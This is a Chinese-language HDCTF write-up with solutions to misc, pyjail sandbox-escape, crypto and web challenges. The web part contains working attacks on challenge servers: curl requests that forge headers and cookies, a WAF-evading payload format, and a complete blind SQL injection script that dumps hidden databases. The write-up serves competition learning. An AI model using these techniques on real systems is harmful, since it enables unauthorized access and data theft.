> 顺便一提，这位成员最近迷上了“拿来主义”，不过借来的东西，总得留个署名。
> 
> 



把题目附件下载下来 发现是HnuSec在做广告

~~这个misc题目一直在做广告 签到题也是关注微信公众号（~~

直接看这个文档没有发现什么东西

把后缀名改为zip 用7\-zip打开试试

找到word/document\.xml 发现了一点小彩蛋

![QQ\_1789265848527\.png](/images/hdctf/QQ_1789265848527.png)

根据题目描述 有个署名 查exif 用 **exiftool**

![83e1327dc90c5e00d59bb6f1e1b85cf4\.png](/images/hdctf/83e1327dc90c5e00d59bb6f1e1b85cf4.png)

解密emoji需要密码 靠猜  

猜测密码`HnuSec` 因为它在Creator显示了 但是一般这里都是空的

~~并且这是~~~~`HnuSec`~~~~的文档 要做一下广告~~

最后解得flag为 HDCTF\{w0rd\_Rev1sion\_1s\_dangerous\}

#### 如烟大帝的秘密

flag:HDCTF\{0bcc6b7e\-cb92\-64f7\-ff25\-79973bb5e0e2\}

这是一道典型的 Python 沙箱逃逸（Pyjail） 题目。

漏洞：

`check()` 把常规 pyjail 逃逸链（`class`/`globals`/`format`/花括号）全封了，但**没封协议自己的状态破坏**。真正的洞在 `safeops.apply`：

```Python
rec["value"] = fn(rec["value"])   # 本该只读，实际是原地改写（破坏性更新）
return _reg(rec["value"])
```

本来，`rec["value"]` 是存在保险柜（`vault`）里的值。按照正常逻辑，`apply` 只是拿这个值去执行一个函数。但这里的代码，**把函数的执行结果，直接又写回了 ****`rec["value"]`**** 里**！！！！

思路：

`vault` 里封的是一个 `_Gate` 对象（用 `f.apply(f.vault, lambda g: ''.startswith(g))` 报 `not _Gate` 探出来），`_Gate` 有个 `read` 绑定方法。于是可以把 vault 的值逐步替换掉，最后靠 `pack` 的报错把秘密写出来。

利用链：

```YAML
f.unlock(f.vault, 4919)                 # 解锁（token 是固定弱整数）
f.apply(f.vault, lambda g: g.read)      # vault 的值被换成 _Gate.read 绑定方法
f.apply(f.vault, lambda g: g())         # 调 read()，秘密写回 rec["value"]
f.apply(f.vault, lambda g: f.pack(g))   # pack 对 str 执行 int(str(v),0) → 报错原样带出秘密
```

1. 开锁：`f.unlock(f.vault, 4919)`
试出保险柜的密码是弱口令 `4919`，直接解锁。

2. 关键一步：`f.apply(f.vault, lambda g: g.read)`
注意，这里没有括号！**这不是调用 ****`read()`****，而是把 ****`_Gate`**** 对象里的 ****`read`**** 方法的本体取出来。**因为前面说的漏洞，这个函数本体被写入了保险柜 `rec["value"]` 中。

3. 触发读取：`f.apply(f.vault, lambda g: g())`
现在 `rec["value"]` 里存的是 `read` 方法。这里用 `g()` 执行它。于是，Flag 被读取出来了！并且，由于漏洞存在，这个 Flag 直接被写入了 `rec["value"]`，取代了原来的东西。

4. 故意报错（写出 Flag）：`f.apply(f.vault, lambda g: f.pack(g))`
现在 `rec["value"]` 变成了字符串格式的 Flag（比如 `HDCTF{...}`）。**程序里的 ****`pack`**** 函数会对它执行 ****`int(str(v), 0)`****，试图把 Flag 当成数字转换。显然会失败！**
系统抛出异常：`ValueError: invalid literal for int() with base 0: 'HDCTF{...}'`。Flag 就这样夹在报错信息里泄露了。

单表达式：

```Python
[f.unlock(f.vault,4919), f.apply(f.vault, lambda g: g.read), f.apply(f.vault, lambda g: f.pack(g()))]
```

回显：

```Python
ValueError: invalid literal for int() with base 0: 'HDCTF{0bcc6b7e-cb92-64f7-ff25-79973bb5e0e2}'
```

也就得到了flag

### Crypto

#### Hybrid cipher

flag:HDCTF\{MORSE\_CAESAR\}

文本：

```JavaScript
.--. .-. ..- ...- .... / ..-. -.. .... ...- -.. ..-
```

摩斯密码正常解出来是 PRUVH FDHVDU

不像明文 像凯撒密码

每个字母往前移之后：MORSE CAESAR

因此flag：HDCTF\{MORSE\_CAESAR\}

#### 不老春

flag:HDCTF\{Gui\_Hua\_Gao\_Shi\_Tian\_De\}

##### 漏洞分析

问题出在 `main.c:15` 的 `uint8_t counter`：

```C
uint8_t counter = 0;
...
counter += (bytes_read + 63) / 64;*   // 每处理 4096 字节加 64*
```

计数器只有 8 位，而每块 4096 字节需要 64 个 ChaCha20 分组：

第 5 块（偏移 16384 起，共 399 字节）与第 1 块使用了**完全相同的密钥流**，构成流密码的密钥流复用。虽然加密函数内部 `state[12]++` 是 32 位，但每次调用都从回绕后的 `counter` 重新初始化，起不到保护作用。

##### 利用过程

1. 附件同时给了 `novel.txt`（小说原文，即已知明文）与 `novel.enc`。UTF\-8 编码后 `novel.bin` 与 `novel.txt` 长度一致（16760），但密文长 16783 字节，多出 **23 字节**——说明明文在末尾还有隐藏内容。

2. 用已知明文求出第 1 块密钥流：`KS = enc[0:399] XOR txt[0:399]`。

3. 用同一密钥流解密最后一块：`P_tail = enc[16384:16783] XOR KS`。

4. 校验：`P_tail[0:376]` 与 `txt` 尾部逐字节完全相等（diff = 0），说明明文确实等于「小说原文 \+ 23 字节附加内容」；多出的 23 字节即：

```C
Gui Hua Gao Shi Tian De
```

用HDCTF格式包裹 再加上下划线即得出flag

#### **Rainbow Sour**

flag:HDCTF\{55020c67\-9d9f\-de1a\-bac4\-9835e28a46b2\}

##### 漏洞点

服务是 Rainbow（MPKC）签名 oracle，`SIGN` 不签目标消息 `unlock-the-rainbow`，但 `KEY` 除了公钥映射 `map` 之外还泄漏了 `trace`：

```Plain Text
"trace": {"codomain_basis": B (6×6), "codomain_shift": b (6)}
```

也就是**输出仿射掩码被公开**。因为 `P = B ∘ F ∘ A + b`，验证条件 `P(x) = target` 等价于

```Plain Text
F(A(x)) = B⁻¹(target − b)
```

令 `G = B⁻¹(P − b) = F ∘ A`，就得到一张显式的、等价于"去掉输出掩码后的公钥"。输入掩码 `A` 未知，但根本不需要恢复它——**`G`**** 自己就能求逆。**

##### 求逆 G

去掉输出掩码后 `G` 仍保留两层结构（只是 `A` 在两个变量块内部做了打乱）：

- 方程 0–2：只含 x0…x6 的二次项，x7…x9 完全不出现

- 方程 3–5：x0…x6 二次 \+ x7,x8,x9 **线性**（二次项中没有 x7/x8/x9 的自乘或互乘）

于是：随机固定 x0…x3 → 在 GF\(31\) 上枚举 x4,x5,x6（31³=29791，期望约 1 个解）满足方程 0–2 → 剩下 3 个方程对 x7,x8,x9 是仿射的，解 3×3 线性方程组。

**一个容易踩的坑**：x7,x8,x9 与已固定的 x0…x6 之间存在双线性交叉项（`G` 的二次部分里有 x6·x7 这类项），系数必须用有限差分取，直接读一次项系数会算错。

##### 提交

```Plain Text
SUBMIT 1e1213051516101d1604
-> OK HDCTF{55020c67-9d9f-de1a-bac4-9835e28a46b2}
```

#### **Fermat's eyes**

flag:HDCTF\{70u\_Kn0w\_ferm@t\_R1ght?yeh1\}

题目代码

```Python
e = 65537
while True:
    p1 = getPrime(512)
    gap = getRandomNBitInteger(264)          # ← 关键 1
    q1 = int(nextprime(p1 + gap))
    if q1.bit_length() == 512:
        break

n1 = p1 * q1
m1 = bytes_to_long(STAGE1)
c1 = pow(m1, e, n1)

r = bytes_to_long(shake_256(STAGE1).digest(96))

while True:
    p2 = getPrime(512)
    q2 = getPrime(512)
    if abs(p2 - q2) > (1 << 480):
        break

n2 = p2 * q2
m2 = bytes_to_long(FLAG)
c2 = pow(m2, e, n2)

S = Matrix([[3, 5], [7, 12]])
D = diag(p2**2, q2**2)
A = S * D * S.inv()

# "eye"
M = A + r * eye(2)                            # ← 关键 2
```

**结论：****`M = S·diag(p2², q2²)·S⁻¹ + r·I`****，是一个相似变换加单位阵的扰动。** 也就是说 `A = M − r·I` 与 `diag(p2², q2²)` **相似**，它们具有完全相同的特征值 `{p2², q2²}`。

##### 对应题目提示

**第一扇门：Fermat 分解 ****`n1`**

##### 1\.1原理

`n1 = p1·q1`，其中 `q1 = nextprime(p1 + gap)`，`gap < 2²⁶⁴`，于是

```Plain Text
Δ = q1 − p1 ≈ gap  <  2²⁶⁴       （相对 512 bit 的 p1 而言极小）
Fermat 分解令 a = (p1+q1)/2，b = (q1−p1)/2，则
```

```Plain Text
a² − n1 = b² = (Δ/2)²
```

从 `a₀ = ⌈√n1⌉` 开始递增 `a`，所需的步数约为

```Plain Text
Δ² / (8·√n1) ≈ 2⁵²⁸ / (8 · 2⁵¹²) = 2¹³ ≈ 8192
```

对于 512\-bit 的 `p1`、264\-bit 的 `gap`，**几千次迭代**就能分解——所谓"看似遥远，其实只差一步"。

##### 1\.2实现

```Python
a = isqrt(n1)
if a * a < n1:
    a += 1
for _ in range(1 << 20):
    b2 = a * a - n1
    b = isqrt(b2)
    if b * b == b2:
        break
    a += 1
p1, q1 = a - b, a + b
assert p1 * q1 == n1
```

实测只用了 **8924 次迭代**：

```Plain Text
[+] fermat iterations: 8924
```

**解出 STAGE1**

```Python
phi1 = (p1 - 1) * (q1 - 1)
m1 = pow(c1, pow(e, -1, phi1), n1)
STAGE1 = long_to_bytes(m1)          *# b'look_at_my_eigs'*
```

如提示所说，"门后没有答案，只有一句留下来的话"——这句留言 `look_at_my_eigs`（看我的特征值）正是第二关的钥匙。

##### 2\.1 还原 r 与 A

```Python
r = int.from_bytes(shake_256(STAGE1).digest(96), 'big')
A = M - r * eye(2)          *# 即 A = [[M00-r, M01], [M10, M11-r]]*
```

注意 `S = [[3,5],[7,12]]`，`det S = 36 − 35 = 1`，所以 `S⁻¹` 是整数矩阵，`A` 也是整数矩阵——这意味着下面的特征多项式在整数环上完全可解，不需要任何数值近似。

##### 2\.2 用特征多项式精确求根

`A` 的特征值就是 `p2²` 和 `q2²`，于是

```Plain Text
T = tr(A) = p2² + q2²
N = det(A) = p2² · q2² = n2²
```

特征方程 `x² − T·x + N = 0` 的判别式

```Plain Text
disc = T² − 4N = (p2² − q2²)²
```

**是一个完全平方数**，所以可以开方取整数根：

```Python
disc = T * T - 4 * N
s = isqrt(disc)
assert s * s == disc
p2sq = (T + s) // 2
q2sq = (T - s) // 2
p2 = isqrt(p2sq)            *# p2sq 是素数的平方，开方无损*
q2 = isqrt(q2sq)
```

之所以能直接对 `p2sq` 开平方得到 `p2`（而不是"接近 p2 的某个数"），是因为 `p2sq` 本身**恰好等于 ****`p2²`**。这也是题目里 `abs(p2−q2) > 2⁴⁸⁰` 这类约束的用意：保证两个特征根不退化、判别式开方后能干净地分离出两个素因子。

##### 解密

```Python
phi2 = (p2 - 1) * (q2 - 1)
FLAG = long_to_bytes(pow(c2, pow(e, -1, phi2), n2))
```

##### Exp

```Python
from math import isqrt
from hashlib import shake_256

e  = 65537
n1 = 83966088337303888568437032157202999613274540527749778783723551126445528583989239819951285109480610565346163627658513189550479579437196648125197240257877012958381906867600055074549139663509786123951059309874080814494545127216487195319227794819849875216254685323916333514894419429115178741873946003203152197123
c1 = 74709493632948194212255864928266978804782833164836716985617283318808829632558715388579513314171566074248517794071816464597005039542275796065211910242331706989285146220781038519495347880780809611549079504361621046551530349585392474480809843308749539929475635766507988596781481578546942137458399231057867699659

n2 = 50798975714945145162874606884522814957131673135889222793971238234229821413934166077597182053382454414832245529454839694410601017235709862588251009895263107427598270182142126621355137314559306041936128736414965737081893926766314424078501176934252250926856934115392150890700060566716131631086431885816434779069
c2 = 29394158317359311083976527002720399311026225595285673078916486642215895098154449659907163843262116749752599178705925976815197196087899633296559043305284610782696554436143756053221874046264566452786381531692814307440885890237890843408304784070004091059592349287604261655584147736808129864649794208798192035081

M = [[321588299957871794178290326092613787305133835585324647452295833618906459072950735247183106564418488771142866584081249565315158660035975517277978044459739803886806605631941667407201128766173350442630495750232112454728602354587009495425155070278911430422691236205712178408323232997304078723989760728518982023264,
      -114357677281988264891388994976657019208627839148087493901556760063991829106646613965776517614221910765793921748842577414265816164525838725017291826409946559240090133362545544365447954770099937530418228909508661405534981495894880801203060899058767616585615285516774171735500030518067513706621645372839193245800],
     [640402992779134283391778371869279307568315899229289965848717856358354242997221038208348498639642700288445961793518433519888570521344696860096834227895700731744504746830255048446508546712559650170342081893248503870995896377011332486737141034729098652879445598893935361718800170901178076757081214087899482176480,
      -219704705843539326307617583463562770282371269715622823681739497350654865365176570857492410142898555520281696360440283528876371185386327781137203267214007243182953358950773909255919190478966353868015787754775551531470310059315426296935999851932588621415887781907018901139710244788215486154019360702919866006856]]

long_to_bytes = lambda x: x.to_bytes((x.bit_length() + 7) // 8, 'big')

# ---------- Stage 1 : Fermat ----------
a = isqrt(n1) + (0 if isqrt(n1) ** 2 == n1 else 1)
for i in range(1 << 20):
    b2 = a * a - n1
    b = isqrt(b2)
    if b * b == b2:
        break
    a += 1
p1, q1 = a - b, a + b
assert p1 * q1 == n1
STAGE1 = long_to_bytes(pow(c1, pow(e, -1, (p1 - 1) * (q1 - 1)), n1))
print("[+] Fermat 迭代次数 :", i)
print("[+] STAGE1          :", STAGE1)

# ---------- Stage 2 : eigenvalues of A = M - r*I ----------
r = int.from_bytes(shake_256(STAGE1).digest(96), 'big')
T = (M[0][0] - r) + (M[1][1] - r)
N = (M[0][0] - r) * (M[1][1] - r) - M[0][1] * M[1][0]

disc = T * T - 4 * N
s = isqrt(disc)
assert s * s == disc
p2sq, q2sq = (T + s) // 2, (T - s) // 2
p2, q2 = isqrt(p2sq), isqrt(q2sq)
assert p2 * p2 == p2sq and q2 * q2 == q2sq and p2 * q2 == n2
print("[+] p2 位数 / q2 位数:", p2.bit_length(), q2.bit_length())

FLAG = long_to_bytes(pow(c2, pow(e, -1, (p2 - 1) * (q2 - 1)), n2))
print("[+] FLAG            :", FLAG)
```

运行结果

```Plain Text
[+] Fermat 迭代次数 : 8924
[+] STAGE1          : b'look_at_my_eigs'
[+] p2 位数 / q2 位数: 512 512
[+] FLAG            : b'HDCTF{70u_Kn0w_ferm@t_R1ght?yeh1}'
```

#### 黄金矿工

flag:HDCTF\{605434fa\-2e7b\-8502\-4d30\-2a31b7dbbde5\}

题目

```Plain Text
goldminer/
├── go.mod
├── main.go              # 交互程序：读 hex nonce，校验 PoW，通过则打印 FLAG
└── hash/
    ├── constants.go     # C1,C2,IV0,IV1,GenesisPrevHash,FixedMerkleRoot,FixedTimestamp
    └── fasthash.go      # FastHash + VerifyBlock
```

待校验的数据是固定的（没有任何随机量），所以**一个 nonce 可以永久复用**：

```Go
payload := fmt.Sprintf("%s,%s,%d,%s",
    hash.GenesisPrevHash,   // 64 个 '0'
    hash.FixedMerkleRoot,   // 4a5e1e4b...a33b（顺便一提，这正是比特币 1 号区块的默克尔根）
    hash.FixedTimestamp,    // 1772880000
    nonce)                  // hex 解码后的原始字节
```

prefix 长度 = 64 \+ 1 \+ 64 \+ 1 \+ 10 \+ 1 = **141 字节**，nonce 追加在其后。

PoW 条件（`VerifyBlock`）只有一条：`FastHash(payload)` 的**前 8 字节全为 0**。

```Go
targetPrefix := bytes.Repeat([]byte{0x00}, 8)
return bytes.Equal(blockHash[:8], targetPrefix)
```

##### FastHash 的结构

```Go
func compress(s0, s1, m0, m1 uint64) (uint64, uint64) {
        s0Prime := (s0 ^ m0) * C1
        s1Prime := (s1 ^ m1) * C2
        s0New   := s0Prime ^ bits.RotateLeft64(s1Prime, 17)
        s1New   := s1Prime ^ bits.RotateLeft64(s0Prime, 41)
        return s0New, s1New
}
```

即每一轮（记 `a = (s0⊕m0)·C1`，`b = (s1⊕m1)·C2`）：

```Go
s0' = a ⊕ rotl(b, 17)
s1' = b ⊕ rotl(a, 41)
```

消息按 16 字节分块，每块拆成两个**大端** `uint64` = `(m0, m1)`；填充规则是 `msg || 0x80 || 0x00... || (0^8 || len_be)`（先补到 16 的倍数，再追加 16 字节长度块， 注意长度块永远是 `m0 = 0, m1 = len`）。摘要的输出是 4 个词：

digest = s0 ‖ s1 ‖ \(s0⊕s1\) ‖ \(s0\+s1\)

##### 攻击构造

取 nonce 长度 `n = 19`（满足 `n ≡ 3 (mod 16)`，且 19 ≥ 16）：

```Go
msg      = prefix(141) ‖ nonce(19)                    共 160 字节，正好 10 个块
padded   = msg ‖ 0x80 ‖ 0x00×15 ‖ 0^8 ‖ len(160)       共 12 个块
```

- 第 10 块 = `msg[144:160]` = **`nonce[3:19]`****，16 字节全部可控**；

- 第 11 块 = `0x8000000000000000 ‖ 0`，**完全固定**（0x80 起新块，后面 15 字节补零）；

- 第 12 块 = 长度块 `(0, 160)`；

- `nonce[0:3]` 是 3 个自由填充字节（取 `00 00 00`），它们影响进入第 10 块的状态 `A`，我们把 `A` 直接算出来即可，不需要控制它。

待反解的链路（从已知到现在）：

```Go
A  --(第10块, 我们选 m0,m1)-->  B  --(第11块, 固定)-->  (S0,S1)  --(第12块, 长度)-->  s0 = 0
```

##### 求解流程

```Python
M1, M2 = 0x5851F42D4C957F2D, 0x14057B7EF767814F
INV1, INV2 = pow(M1, -1, 2**64), pow(M2, -1, 2**64)
L, F0, F1 = 160, 0x8000000000000000, 0          # 长度、固定块的 (m0, m1)
A0, A1 = 状态(prefix + nonce[0:3])               # 9 个块压完，直接算

for Z in 随机:                                    # Z 是第 11 块之后的 s1
    S0 = rotl(((Z ^ L) * M2) & M64, 17) * INV1 & M64     # ① 保证 s0_final = 0

    W = Z ^ rotl(S0, 41)                                  # ② 反解第 11 块: B -> (S0, Z)
    if not parity_ok(W): continue                         #    2 bit 可达性检查
    b = solve_rot58(W); a = S0 ^ rotl(b, 17)
    B0 = (a * INV1) & M64 ^ F0
    B1 = (b * INV2) & M64 ^ F1

    W2 = B1 ^ rotl(B0, 41)                                # ③ 反解第 10 块: A -> B
    if not parity_ok(W2): continue
    b2 = solve_rot58(W2); a2 = B0 ^ rotl(b2, 17)
    m0 = (a2 * INV1) & M64 ^ A0
    m1 = (b2 * INV2) & M64 ^ A1

    nonce[3:19] = be64(m0) ‖ be64(m1)                      # ④ 写回 nonce
```

结果

```Go
nonce  : 0000001b7d18500c3acb8857e937e84579ce00
payload: 0000000000000000000000000000000000000000000000000000000000000000,
         4a5e1e4baab89f3a32518a88c31bc87f618f76673e2cc77ab2127b7afdeda33b,
         1772880000,
         <19 字节二进制 nonce>
digest : 00000000000000004f6d5a5a0a4abced4f6d5a5a0a4abced4f6d5a5a0a4abced
         ^^^^^^^^^^^^^^^^ 8 字节全 0，且后 24 字节三次重复同一个 s1（s0=0 的特征）
```

### Web

#### 123罗德岛

flag:HDCTF\{8b5f74b4\-239d\-ee20\-1398\-6b36f479905b\}

复现：

```Plain Text
1. XFF 伪造
curl -H "X-Forwarded-For: 127.0.0.1" http://150.242.245.3:32026/hdctf_internal
```

```Plain Text
2. UA + Referer
curl -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: PRTS" \
     -H "Referer: http://150.242.245.3:32026/intel/list" \
     http://150.242.245.3:32026/hdctf_mission
```

```Plain Text
3. JSON 归档
curl -X POST -H "Content-Type: application/json" \
     -d '{"operator":"doctor","task":"operation-blue","priority":3}' \
     http://150.242.245.3:32026/hdctf_report
```

```Plain Text
4. Cookie 取 flag
curl -b "token=rhodes_topsecret" http://150.242.245.3:32026/hdctf_classified
```

#### 样本档案管理

flag：HDCTF\{d9714971\-32db\-7f32\-6c1a\-57f727c02415\}

攻击链：

```Plain Text
robots.txt 残留 legacy-manager-key(base64)
        └─> admin / hdctf260912 登录
                └─> /search.php?id= 数字型 SQL 注入
                        └─> WAF 绕过(/**/ + %26%26 + # + </>)
                                └─> 布尔盲注
                                        └─> 跨库(guizang)枚举与 dump -> flag
```

1\.信息泄露 → 后台登录

根路径是登录页，HTML 注释给了账号 `admin`。先看 `robots.txt`：

```Plain Text
User-agent: *
Disallow: /admin
Disallow: /search.php

# legacy-manager-key: aGRjdGYyNjA5MTI=
```

题目里"**历史遗留内容未及清理**"就指这条。Base64 解码得 `hdctf260912`，即管理员口令：

```Plain Text
curl -i -X POST -d "username=admin&password=hdctf260912" http://150.242.245.3:31338/
# 302 -> /query.php, Set-Cookie: auth=...
```

2\.WAF 指纹

`/query.php` 的表单 `POST /search.php`，参数 `id`。

黑名单（实测）：空白符、`=`、`and`、`union`、`sleep`、`benchmark`、`updatexml`、`extractvalue`、`floor`、`rand`、`regexp`、`gtid` 等；`select`/`from`/`where`/`information_schema`/`substr`/`ascii`/`group_concat`/`concat_ws`/`like` 等均放行。这就是"**更新了查询规则**"。

绕过组合：

注入点还原：

```Plain Text
SELECT idx, code, zone FROM sample_ledger WHERE id = $id      -- 数字型
```

因此payload格式

```Plain Text
1/**/&&(<布尔表达式>)#
```

二分长度 \+ 逐字节二分 ascii

```Python
import urllib.request, urllib.parse, http.cookiejar, re, time

BASE = "http://150.242.245.3:31338"

# ---- 1) robots.txt 泄露的历史遗留管理员口令（base64）----
# User-agent: *
# Disallow: /admin
# Disallow: /search.php
# # legacy-manager-key: aGRjdGYyNjA5MTI=
LEGACY_KEY_B64 = "aGRjdGYyNjA5MTI="
USERNAME = "admin"
PASSWORD = __import__("base64").b64decode(LEGACY_KEY_B64).decode()   # hdctf260912

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]

def login():
    data = urllib.parse.urlencode({"username": USERNAME, "password": PASSWORD}).encode()
    op.open(BASE + "/", data)          # 302 -> /query.php，会话写入 CookieJar

def post(payload):
    """把 payload 作为 id 参数原样发送；注意：
       - 必须手动编码 `&` 为 %26，否则 x-www-form-urlencoded 会把它当成参数分隔符；
       - `#` 编码为 %23 更稳妥。"""
    req = urllib.request.Request(
        BASE + "/search.php",
        data=b"id=" + payload.encode("latin-1"),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    for _ in range(4):
        try:
            return op.open(req).read().decode("utf-8", "replace")
        except Exception:
            time.sleep(0.3)
    raise RuntimeError("connection blocked")

def cond(sql):
    """sql 为不含空白的布尔表达式；返回 True/False。
       注入点： SELECT ... WHERE id = $id      （数字型，无引号包裹）
       绕过：  空白 -> /**/     AND -> &&      '=' -> '<' / '>'     '#' 注释收尾
    """
    body = post("1/**/%26%26(" + sql + ")%23")
    if "访问被拒绝" in body:
        raise RuntimeError("WAF DENY: " + sql)
    if "查询失败" in body:
        raise RuntimeError("SQL ERROR: " + sql)
    if "<tbody>" in body:
        return True       # 命中样本（真）
    if "未找到样本" in body:
        return False      # 未命中（假）
    raise RuntimeError("UNKNOWN RESPONSE")

def extract(expr, maxlen=3000, label=None):
    """对任意标量表达式做布尔盲注：先二分长度，再逐字节二分 ascii。"""
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        lo, hi = (mid + 1, hi) if cond("length(%s)>%d" % (expr, mid)) else (lo, mid)
    n = lo
    out = []
    for i in range(1, n + 1):
        lo, hi = 0, 255
        while lo < hi:
            mid = (lo + hi) // 2
            lo, hi = (mid + 1, hi) if cond("ascii(substr(%s,%d,1))>%d" % (expr, i, mid)) else (lo, mid)
        out.append(lo & 0xFF)
    s = bytes(out).decode("utf-8", "replace")
    print("[+] %s = %s" % (label or expr, s), flush=True)
    return s

def q(s):
    """把空白转成 /**/，方便书写 payload。"""
    return s.replace(" ", "/**/")

if __name__ == "__main__":
    login()
    print("[*] logged in as admin (legacy key)")

    # 2) 确认注入点与库名
    extract("database()", 64, "database()")
    extract("version()", 64, "version()")

    # 3) 枚举所有 schema —— 发现隐藏库 guizang
    extract(q("(select group_concat(schema_name) from information_schema.schemata)"), 500, "schemas")

    # 4) guizang.abyss_core 的表结构
    extract(q("(select group_concat(table_name) from information_schema.tables "
              "where table_schema like %27guizang%27)"), 500, "guizang.tables")
    extract(q("(select group_concat(column_name) from information_schema.columns "
              "where table_schema like %27guizang%27 && table_name like %27abyss_core%27)"),
            500, "abyss_core.columns")

    # 5) dump 数据
    extract(q("(select concat_ws(0x7c,idx,mark,token) from guizang.abyss_core limit 1,1)"),
            3000, "abyss_core[1]")

```

`wuling` 库里的表：

```Plain Text
transfer_log, sample_ledger, seed_vault
```

Dump

```Plain Text
sample_ledger: 1|XR-2001|景玉谷|stable ... 4|XR-2048|locked  5|XR-8192|sleeping
transfer_log : 1|XR-2001|sample moved into public catalogue
               2|XR-2002|checksum passed
               3|XR-2003|relay record synchronized
               4|XR-2048|sealed by root archive
               5|XR-8192|inactive sample, no public data
seed_vault   : 1|amber-alpha|flag{fake_flag}      <-- 假 flag
```

不要只看 `database()` 所在的库，直接遍历 `information_schema.schemata`：

```Plain Text
id=1/**/&&ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),1,1))>0#
```

```Plain Text
schemas = information_schema, guizang, wuling
```

隐藏库 `guizang`（归藏）。继续枚举：

```Plain Text
guizang.tables            = abyss_core
abyss_core.columns        = idx, mark, token
```

dump 全表（`count(*) = 2`）：

```Plain Text
abyss_core[0] = 1 | ghost-core  | flag{nothing_here}                          <-- 第二个诱饵
abyss_core[1] = 2 | signal-core | HDCTF{d9714971-32db-7f32-6c1a-57f727c02415}  <-- 真 flag
```

关键 payload：

```SQL
id=1/**/&&ascii(substr((select/**/concat_ws(0x7c,idx,mark,token)/**/from/**/guizang.abyss_core/**/limit/**/1,1),1,1))>0#
```
